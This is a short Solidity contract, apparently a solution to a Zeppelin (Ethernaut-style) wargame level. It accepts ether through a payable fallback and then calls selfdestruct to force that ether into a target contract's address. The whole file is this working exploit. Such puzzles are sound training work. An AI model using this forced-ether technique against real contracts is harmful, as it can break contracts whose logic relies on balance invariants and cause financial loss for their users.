pragma solidity ^0.4.18;
contract forceFeeder{
    function () public payable{

    }
    function feeder(address param) public{ /*param Is Your Zepplin Main Contract Address*/
        selfdestruct(param);
    }
}